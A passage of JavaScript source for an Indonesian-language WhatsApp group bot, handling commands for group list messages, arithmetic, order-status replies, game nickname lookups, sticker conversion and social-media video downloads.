                reply(`Sukses set list message dengan key : *${menu}*`)
            } else {
                var data1 = listStore[cekPos].cmd
                var data2 = listStore[cekPos].sections[0].rows
                var posCmd = getPosiCmd(menu, data1)
                if (posCmd !== null) return reply(`Sukses set list message dengan key : *${menu}*`)
                var isi1 = { menu, harga }
                var isi2 = { title: menu, rowId: menu }
                data1.push(isi1)
                data2.push(isi2)
                fs.writeFileSync('./database/list-message.json', JSON.stringify(listStore, null, 2))
                reply(`Sukses set list message dengan key : *${menu}*`)
            }
            break
        case prefix+'dellist': case prefix+'listdel':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            var cekPosii = getPosiMenu(from, listStore)
            if (cekPosii == null) return reply(`Belum ada list message yang terdaftar di group ini`)
            if (args.length < 2) return reply(`*Gunakan dengan cara ${command} *key*\n\n_Contoh_\n\n${command} hello`)
            var data1 = listStore[cekPosii].sections[0].rows
            var data2 = listStore[cekPosii].cmd
            var posiRows = getPosiRows(q, data1)
            var posiCmd = getPosiCmd(q, data2)
            if (posiRows == null) return reply(`List respon dengan key *${q}* tidak ada di database!`)
            data1.splice(posiRows, 1)
            data2.splice(posiCmd, 1)
            fs.writeFileSync('./database/list-message.json', JSON.stringify(listStore, null, 2))
            reply(`Sukses delete list message dengan key *${q}*`)
            if (data1.length == 0 && data2.length == 0) {
                listStore.splice(cekPosii, 1)
                fs.writeFileSync('./database/list-message.json', JSON.stringify(listStore, null, 2))
            }
            break
        case prefix+'update': case prefix+'listupdate': case prefix+'updatelist':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            var cekPosiu = getPosiMenu(from, listStore)
            if (cekPosiu == null) return reply(`Belum ada list message yang terdaftar di group ini`)
            if (args.length < 2) return reply(`*Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n${command} tes@apa`)
            if (!q.includes('@')) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n${command} tes@apa`)
            var menu = q.split('@')[0]
            var harga = q.split('@')[1].replace(' ', ' ')
            var data1 = listStore[cekPosiu].sections[0].rows
            var data2 = listStore[cekPosiu].cmd
            var posiRows = getPosiRows(menu, data1)
            var posiCmd = getPosiCmd(menu, data2)
            if (posiRows == null) return reply(`List respon dengan key *${menu}* tidak ada di database!`)
            data2[posiCmd].harga = harga
            fs.writeFileSync('./database/list-message.json', JSON.stringify(listStore, null, 2))
            reply(`Sukses update respon list dengan key *${menu}*`)
            break
        case prefix+'jeda': {
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!isBotGroupAdmins) return reply(mess.BotAdmin)
            if (!args[1]) return reply(`kirim ${command} waktu\nContoh: ${command} 30m\n\nlist waktu:\ns = detik\nm = menit\nh = jam\nd = hari`)
            opengc[from] = { id: from, time: Date.now() + toMS(args[1]) }
            fs.writeFileSync('./database/opengc.json', JSON.stringify(opengc))
            xnone.groupSettingUpdate(from, "announcement")
            .then((res) => reply(`Sukses, group akan dibuka ${args[1]} lagi`))
            .catch((err) => reply('Error'))
            }
            break
        case prefix+'tambah':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one + nilai_two}`)
            break
        case prefix+'kurang':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one - nilai_two}`)
            break
        case prefix+'kali':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one * nilai_two}`)
            break
        case prefix+'bagi':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one / nilai_two}`)
            break
        case 'p': case 'proses': case 'y':
            if (!isGroup) return
            if (!isOwner && !isGroupAdmins) return
            if (!isQuotedMsg) return
            let numb = quotedMsg.sender
            let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam} WIB\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan :\n${quotedMsg.chats}\n\nPesanan @${numb.split("@")[0]} sedang di proses!`
            mentions(proses, [numb], true)
            break
        case 'd': case 'done':
            if (!isGroup) return
            if (!isOwner && !isGroupAdmins) return
            if (!isQuotedMsg) return
            let numbb = quotedMsg.sender
            let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam} WIB\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih @${numbb.split("@")[0]} Next Order ya🙏`
            mentions(sukses, [numbb], true)
            break
        case prefix+'nickff':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (!q) return reply(`Gunakan dengan cara ${command} *id*\n\n_Contoh_\n\n${command} 646675175`)
            axios.get(`https://api.lolhuman.xyz/api/freefire/${args[1]}?apikey=${apikeys}`)
            .then(({data}) => {
            let epep = `*🔎 CHECK NICK FREE FIRE 🔍*

ID : ${args[1]}
Nick : ${data.result}`
            reply(epep)
            limitAdd(sender, limit)
            })
            .catch((err) => {
                reply(mess.error.api)
            })
            break
        case prefix+'nickml':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            var args1 = q.split("/")[0]
            var args2 = q.split("/")[1]                
            if (!q.includes("/")) return reply(`Gunakan dengan cara ${command} *id/server*\n\n_Contoh_\n\n${command} 617243212/8460`)
            axios.get(`https://api.lolhuman.xyz/api/mobilelegend/${args1}/${args2}?apikey=${apikeys}`)
            .then(({data}) => {
            let emel = `*🔎 CHECK NICK MOBILE LEGENDS 🔍*

ID : ${args[1]}
Nick : ${data.result}`
reply(emel)
            limitAdd(sender, limit)
            })
            .catch((err) => {
                reply(mess.error.api)
            })
            break
        case prefix+'nickpubg':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (!q) return reply(`Gunakan dengan cara ${command} *id*\n\n_Contoh_\n\n${command} 5217933016`)
            axios.get(`https://api.lolhuman.xyz/api/pubg/${args[1]}?apikey=${apikeys}`)
            .then(({data}) => {
            let pubg = `*🔎 CHECK NICK PUBG 🔍*

ID : ${args[1]}
Nick : ${data.result}`
            reply(pubg)
            limitAdd(sender, limit)
            })
            .catch((err) => {
                reply(mess.error.api)
            })
            break
        case prefix+'nickdomino':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (!q) return reply(`Gunakan dengan cara ${command} *id*\n\n_Contoh_\n\n${command} 291756557`)
            axios.get(`https://api.lolhuman.xyz/api/higghdomino/${args[1]}?apikey=${apikeys}`)
            .then(({data}) => {
            let domino = `*🔎 CHECK NICK HIGGS DOMINO 🔍*

ID : ${args[1]}
Nick : ${data.result}`
            reply(domino)
            limitAdd(sender, limit)
            })
            .catch((err) => {
                reply(mess.error.api)
            })
            break

        // Tools Menu
        case prefix+'attp':{
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (args.length < 2) return reply(`Kirim perintah ${command} teks\n\nContoh : ${command} Divaa Cnci`)
            let ane = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(q)}`)
            fs.writeFileSync('./sticker/attp.webp', ane)
            exec(`webpmux -set exif ./sticker/data.exif ./sticker/attp.webp -o ./sticker/attp.webp`, async (error) => {
                if (error) return reply(mess.error.api)
                xnone.sendMessage(from, { sticker: fs.readFileSync(`./sticker/attp.webp`) }, {quoted: msg})
                limitAdd(sender, limit)
                fs.unlinkSync(`./sticker/attp.webp`)	
                })
            }
            break
        case prefix+'sticker': case prefix+'stiker': case prefix+'s':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (isImage || isQuotedImage) {
                var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
                var buffer = Buffer.from([])
                for await(const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                var rand1 = 'sticker/'+getRandom('.jpg')
                var rand2 = 'sticker/'+getRandom('.webp')
                fs.writeFileSync(`./${rand1}`, buffer)
                ffmpeg(`./${rand1}`)
                .on("error", console.error)
                .on("end", () => {
                    exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
                        xnone.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
                        limitAdd(sender, limit)
                        fs.unlinkSync(`./${rand1}`)
                        fs.unlinkSync(`./${rand2}`)
                     })
                })
                .addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
                .toFormat('webp')
                .save(`${rand2}`)
                } else if (isVideo || isQuotedVideo) {
                    var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
                    var buffer = Buffer.from([])
                    for await(const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                var rand1 = 'sticker/'+getRandom('.mp4')
                var rand2 = 'sticker/'+getRandom('.webp')
                fs.writeFileSync(`./${rand1}`, buffer)
                ffmpeg(`./${rand1}`)
                .on("error", console.error)
                .on("end", () => {
                    exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
                        xnone.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
                        limitAdd(sender, limit)
                        fs.unlinkSync(`./${rand1}`)
                        fs.unlinkSync(`./${rand2}`)
                    })
                })
                .addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
                .toFormat('webp')
                .save(`${rand2}`)
                } else {
                    reply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
                }
                break
            case prefix+'smeme': case prefix+'stikermeme': case prefix+'stickermeme': case prefix+'memestiker':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                var atas = q.includes('|') ? q.split('|')[0] ? q.split('|')[0] : q : '-'
                var bawah = q.includes('|') ? q.split('|')[1] ? q.split('|')[1] : '' : q
                var opt = { packname: 'Created By', author: 'Divaa Cnci' }
                if (isImage || isQuotedImage) {
                    try {
                        if (args.length < 2) return reply(`Kirim perintah ${command} teks atas|teks bawah`)
                        reply(mess.wait)
                        var media = await xnone.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender+Date.now()}.jpg`)
                        var media_url = (await ra.UploadFile(media)).result.namaFile
                        var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${media_url}`
                        xnone.sendImageAsSticker(from, meme_url, msg, opt)
                        limitAdd(sender, limit)
                        fs.unlinkSync(media)
                    } catch (e) {
                        reply(mess.error.api)
                    }
                } else if (isQuotedSticker) {
                    try {
                        if (args.length < 2) return reply(`Kirim perintah ${command} teks atas|teks bawah`)
                        reply(mess.wait)
                        var media = await xnone.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${sender+Date.now()}.webp`)
                        var media_url = (await ra.UploadFile(media)).result.namaFile
                        var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${media_url}`
                        xnone.sendImageAsSticker(from, meme_url, msg, opt)
                        limitAdd(sender, limit)
                        fs.unlinkSync(media)
                    } catch (err) {
                        reply(mess.error.api)
                    }
                } else {
                    reply(`Kirim Gambar atau balas Sticker dengan caption ${command} teks atas|teks bawah`)
                }
                break
            case prefix+'toimg': case prefix+'toimage': case prefix+'tovid': case prefix+'tovideo':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!isQuotedSticker) return reply(`Reply stikernya!`)
                reply(mess.wait)
                var stream = await downloadContentFromMessage(msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
                var buffer = Buffer.from([])
                for await(const chunk of stream) {
                   buffer = Buffer.concat([buffer, chunk])
                }
                var rand1 = 'sticker/'+getRandom('.webp')
                var rand2 = 'sticker/'+getRandom('.png')
                fs.writeFileSync(`./${rand1}`, buffer)
                if (isQuotedSticker && msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated !== true) {
                   exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
                       fs.unlinkSync(`./${rand1}`)
                       if (err) return reply(mess.error.api)
                       xnone.sendMessage(from, { image: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
                       limitAdd(sender, limit)
                       fs.unlinkSync(`./${rand2}`)
                       })
                   } else {
                    reply(mess.wait)
                    webp2mp4File(`./${rand1}`).then( data => {
                        fs.unlinkSync(`./${rand1}`)
                        xnone.sendMessage(from, { video: { url: data.result }}, { quoted: msg })
                        limitAdd(sender, limit)
                    })
                }
                break
            case prefix+'nulis':
            reply(`*Pilihan Fitur Nulis*
1. ${prefix}nuliskiri
2. ${prefix}nuliskanan
3. ${prefix}foliokiri
4. ${prefix}foliokanan

Contoh:
${prefix}nuliskiri Jangan Lupa Donasi`)
            break
        case prefix+'nuliskiri': {
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (args.length < 2) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)
            reply(mess.wait)
            const tulisan = body.slice(11)
            const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
            const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
            spawn('convert', [
                './media/nulis/images/buku/sebelumkiri.jpg',
                '-font',
                './media/nulis/font/Indie-Flower.ttf',
                '-size',
                '960x1280',
                '-pointsize',
                '22',
                '-interline-spacing',
                '2',
                '-annotate',
                '+140+153',
                fixHeight,
                './media/nulis/images/buku/setelahkiri.jpg'
            ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    xnone.sendMessage(from, { caption: 'Jangan males pak...', image: fs.readFileSync('./media/nulis/images/buku/setelahkiri.jpg') }, { quoted: msg, thumbnail: Buffer.alloc(0) })
                    limitAdd(sender, limit)
                })
            }
            break
        case prefix+'nuliskanan': {
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (args.length < 2) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
            reply(mess.wait)
            const tulisan = body.slice(12)
            const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
            const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
            spawn('convert', [
                './media/nulis/images/buku/sebelumkanan.jpg',
                '-font',
                './media/nulis/font/Indie-Flower.ttf',
                '-size',
                '960x1280',
                '-pointsize',
                '23',
                '-interline-spacing',
                '2',
                '-annotate',
                '+128+129',
                fixHeight,
                './media/nulis/images/buku/setelahkanan.jpg'
            ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    xnone.sendMessage(from, { caption: 'Jangan males pak...', image: fs.readFileSync('./media/nulis/images/buku/setelahkanan.jpg') }, { quoted: msg, thumbnail: Buffer.alloc(0) })
                    limitAdd(sender, limit)
                })
            }
            break
        case prefix+'foliokiri': {
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (args.length < 2) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
            reply(mess.wait)
            const tulisan = body.slice(11)
            const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
            const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
            spawn('convert', [
                './media/nulis/images/folio/sebelumkiri.jpg',
                '-font',
                './media/nulis/font/Indie-Flower.ttf',
                '-size',
                '1720x1280',
                '-pointsize',
                '23',
                '-interline-spacing',
                '4',
                '-annotate',
                '+48+185',
                fixHeight,
                './media/nulis/images/folio/setelahkiri.jpg'
            ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    xnone.sendMessage(from, { caption: 'Jangan males pak...', image: fs.readFileSync('./media/nulis/images/folio/setelahkiri.jpg') }, { quoted: msg, thumbnail: Buffer.alloc(0) })
                    limitAdd(sender, limit)
                })
            }
            break
        case prefix+'foliokanan': {
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (args.length < 2) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
            reply(mess.wait)
            const tulisan = body.slice(12)
            const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
            const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
            spawn('convert', [
                './media/nulis/images/folio/sebelumkanan.jpg',
                '-font',
                './media/nulis/font/Indie-Flower.ttf',
                '-size',
                '960x1280',
                '-pointsize',
                '23',
                '-interline-spacing',
                '3',
                '-annotate',
                '+89+190',
                fixHeight,
                './media/nulis/images/folio/setelahkanan.jpg'
            ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    xnone.sendMessage(from, { caption: 'Jangan males pak...', image: fs.readFileSync('./media/nulis/images/folio/setelahkanan.jpg') }, { quoted: msg, thumbnail: Buffer.alloc(0) })
                    limitAdd(sender, limit)
                })
            }
            break

            // Downloads Menu
            case prefix+'play':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} query\nContoh : ${command} dandelions`)
                reply(mess.wait)
                await sendPlay(from, q)
                limitAdd(sender, limit)
                break
            case prefix+'ytmp3': case prefix+'mp3':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                if (!isUrl(args[1])) return reply(mess.error.Iv)
                if (!args[1].includes('youtu.be') && !args[1].includes('youtube.com')) return reply(mess.error.Iv)
                reply(mess.wait)
                xfar.Youtube(args[1]).then( data => {
                    var teks = `*Youtube Audio Downloader*\n\n*≻ Title :* ${data.title}\n*≻ Quality :* ${data.medias[7].quality}\n*≻ Size :* ${data.medias[7].formattedSize}\n*≻ Url Source :* ${data.url}\n\n_wait a minute sending media..._`
                    xnone.sendMessage(from, { image: { url: data.thumbnail }, caption: teks }, { quoted: msg })
                    xnone.sendMessage(from, { audio: { url: data.medias[7].url }, mimetype: 'audio/mp4' }, { quoted: msg })
                    limitAdd(sender, limit)
                }).catch(() => reply(mess.error.api))
                break
           case prefix+'ytmp4': case prefix+'mp4':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                if (!isUrl(args[1])) return reply(mess.error.Iv)
                if (!args[1].includes('youtu.be') && !args[1].includes('youtube.com')) return reply(mess.error.Iv)
                reply(mess.wait)
                xfar.Youtube(args[1]).then( data => {
                    var teks = `*Youtube Video Downloader*\n\n*≻ Title :* ${data.title}\n*≻ Quality :* ${data.medias[1].quality}\n*≻ Size :* ${data.medias[1].formattedSize}\n*≻ Url Source :* ${data.url}\n\n_wait a minute sending media..._`
                    xnone.sendMessage(from, { image: { url: data.thumbnail }, caption: teks }, { quoted: msg })
                    xnone.sendMessage(from, { video: { url: data.medias[1].url }}, { quoted: msg })
                    limitAdd(sender, limit)
                }).catch(() => reply(mess.error.api))
                break
            case prefix+'getmusik': case prefix+'getmusic':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!isQuotedImage) return reply(`Balas hasil pencarian dari ${prefix}ytsearch dengan teks ${command} <no urutan>`)
                if (!quotedMsg.fromMe) return reply(`Hanya bisa mengambil hasil dari pesan bot`)
                if (args.length < 1) return reply(`Balas hasil pencarian dari ${prefix}ytsearch dengan teks ${command} <no urutan>`)
                var kuoted = await quotedMsg.chats
                var ytIdRegex = /(?:http(?:s|):\/\/|)(?:(?:www\.|)youtube(?:\-nocookie|)\.com\/(?:watch\?.*(?:|\&)v=|embed\/|v\/)|youtu\.be\/)([-_0-9A-Za-z]{11})/gi
                var arrey = [...kuoted.matchAll(ytIdRegex)].map(x => x[1])
                if (arrey.length == 0) return reply(`Reply hasil dari *${prefix}ytsearch* dengan perintah *${command}* urutan`)
                if (isNaN(args[1])) return reply(`Hanya support angka! pilih angka 1 sampai 10\nContoh : ${command} 2`)
                if (args[1] > arrey.length) return reply(`Urutan Hasil *${prefix}ytsearch* Hanya Sampai *${arrey.length}*`)
                reply(mess.wait)
                xfar.Youtube(`https://youtube.com/watch?v=${arrey[args[1] -1]}`).then( data => {
                    var teks = `*Youtube Audio Downloader*\n\n*≻ Title :* ${data.title}\n*≻ Quality :* ${data.medias[7].quality}\n*≻ Size :* ${data.medias[7].formattedSize}\n*≻ Url Source :* ${data.url}\n\n_wait a minute sending media..._`
                    xnone.sendMessage(from, { image: { url: data.thumbnail }, caption: teks }, { quoted: msg })
                    xnone.sendMessage(from, { document: { url: data.medias[7].url }, fileName: `${data.title}.mp3`, mimetype: 'audio/mp3' }, { quoted: msg })
                    limitAdd(sender, limit)
                }).catch(() => reply(mess.error.api))
                break
            case prefix+'getvideo': case prefix+'getvidio':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!isQuotedImage) return reply(`Balas hasil pencarian dari ${prefix}ytsearch dengan teks ${command} <no urutan>`)
                if (!quotedMsg.fromMe) return reply(`Hanya bisa mengambil hasil dari pesan bot`)
                if (args.length < 1) return reply(`Balas hasil pencarian dari ${prefix}ytsearch dengan teks ${command} <no urutan>`)
                var kuoted = await quotedMsg.chats
                var ytIdRegex = /(?:http(?:s|):\/\/|)(?:(?:www\.|)youtube(?:\-nocookie|)\.com\/(?:watch\?.*(?:|\&)v=|embed\/|v\/)|youtu\.be\/)([-_0-9A-Za-z]{11})/gi
                var arrey = [...kuoted.matchAll(ytIdRegex)].map(x => x[1])
                if (arrey.length == 0) return reply(`Reply hasil dari *${prefix}ytsearch* dengan perintah *${command}* urutan`)
                if (isNaN(args[1])) return reply(`Hanya support angka! pilih angka 1 sampai 10\nContoh : ${command} 2`)
                if (args[1] > arrey.length) return reply(`Urutan Hasil *${prefix}ytsearch* Hanya Sampai *${arrey.length}*`)
                reply(mess.wait)
                xfar.Youtube(`https://youtube.com/watch?v=${arrey[args[1] -1]}`).then( data => {
                    var teks = `*Youtube Video Downloader*\n\n*≻ Title :* ${data.title}\n*≻ Quality :* ${data.medias[1].quality}\n*≻ Size :* ${data.medias[1].formattedSize}\n*≻ Url Source :* ${data.url}\n\n_wait a minute sending media..._`
                    xnone.sendMessage(from, { video: { url: data.medias[1].url }, caption: teks }, { quoted: msg })
                    limitAdd(sender, limit)
                }).catch(() => reply(mess.error.api))
                break
            case prefix+'tiktokwm':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (args.length < 2) return reply(`Kirim perintah ${command} link`)
			    if (!isUrl(args[1])) return reply(mess.error.Iv)
			    if (!args[1].includes('tiktok')) return reply(mess.error.Iv)
			    reply(mess.wait)
			    xfar.Tiktok(args[1]).then( data => {
                    xnone.sendMessage(from, { video: { url: data.medias[0].url }}, { quoted: msg })
			        limitAdd(sender, limit)
			    }).catch(() => reply(mess.error.api))
			    break
			case prefix+'tiktok':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (args.length < 2) return reply(`Kirim perintah ${command} link`)
			    if (!isUrl(args[1])) return reply(mess.error.Iv)
			    if (!args[1].includes('tiktok')) return reply(mess.error.Iv)
			    reply(mess.wait)
			    hxz.ttdownloader(args[1]).then( data => {
			      xnone.sendMessage(from, { caption: `Nih kak`, video: { url: data.nowm }, templateButtons: buttonsTiktod, footer: `Pilih untuk mengubah video menjadi audio`, mentions: [sender] })
			      limitAdd(sender, limit)
				}).catch(() => reply(mess.error.api))
			    break
			case prefix+'tiktokaudio':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (args.length < 2) return reply(`Kirim perintah ${command} link`)
			    if (!isUrl(args[1])) return reply(mess.error.Iv)
			    if (!args[1].includes('tiktok')) return reply(mess.error.Iv)
			    reply(mess.wait)
			    hxz.ttdownloader(args[1]).then( data => {
			      xnone.sendMessage(from, { audio: { url: data.nowm }, mimetype: 'audio/mp4' }, { quoted: msg })
			       limitAdd(sender, limit)
				}).catch(() => reply(mess.error.api))
		        break
            case prefix+'igdl': case prefix+'instagram': case prefix+'ig':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
				if (args.length < 2) return reply(`Kirim perintah ${command} link`)
			    if (!isUrl(args[1])) return reply(mess.error.Iv)
			    if (!args[1].includes('instagram.com')) return reply(mess.error.Iv)
			    reply(mess.wait)
			    xfar.Instagram(args[1]).then( data => {
			     var teks = `*Instagram Downloader*\n\n*≻ Title :* ${data.title}\n*≻ Jumlah Media :* ${data.medias.length}\n*≻ Url Source :* ${data.url}\n\n_wait a minute sending media..._`
			     reply(teks)
			     for (let i of data.medias) {
				  if (i.extension === "mp4") {
				   xnone.sendMessage(from, { video: { url: i.url }})
				  } else if (i.extension === "jpg") {
				   xnone.sendMessage(from, { image: { url: i.url }})
			      }
			     }
				 limitAdd(sender, limit)
			    }).catch(() => reply(mess.error.api))
			    break
			case prefix+'facebook': case prefix+'fbdl':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (args.length < 2) return reply(`Kirim perintah ${command} link`)
			    if (!isUrl(args[1])) return reply(mess.error.Iv)
			    if (!args[1].includes('facebook.com')) return reply(mess.error.Iv)
			    reply(mess.wait)
			    xfar.Facebook(args[1]).then( data => {
			      xnone.sendMessage(from, { video: { url: data.medias[0].url }, caption: data.title }, { quoted: msg })
			      limitAdd(sender, limit)
				}).catch(() => reply(mess.error.api))
			    break

            // Search Menu
            case prefix+'lirik': case 'liriklagu':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} judul lagu`)
                reply(mess.wait)
                ra.Musikmatch(q).then(async(data) => {
                    var teks = `*${data.result.judul} - ${data.result.penyanyi}*\n\n${data.result.lirik}`
                    xnone.sendMessage(from, { image: { url: data.result.thumb }, caption: teks }, { quoted: msg })
                    limitAdd(sender, limit)
                }).catch(() => reply(`Judul lagu tidak ditemukan`))
                break
			case prefix+'grupwa': case prefix+'searchgrup': case prefix+'groupwa':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
				if (args.length < 2) return reply(`Kirim perintah ${command} nama grup`)
				reply(mess.wait)
			    hxz.linkwa(q).then(async(data) => {
				  if (data.length == 0) return reply(`Grup ${q} tidak ditemukan`)
				  var teks = `*Hasil Pencarian Dari ${q}*\n\n`
				  for (let x of data) {
					teks += `*Nama :* ${x.nama}\n*Link :* ${x.link}\n\n`
				  }
				  reply(teks)
				  limitAdd(sender, limit)
				}).catch(() => reply(mess.error.api))
			    break
			case prefix+'pinterest':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
				if (args.length < 2) return reply(`Kirim perintah ${command} query atau ${command} query --jumlah\nContoh :\n${command} cecan atau ${command} cecan --10`)
				reply(mess.wait)
			    var jumlah;
			    if (q.includes('--')) jumlah = q.split('--')[1]
			    pinterest(q.replace('--'+jumlah, '')).then(async(data) => {
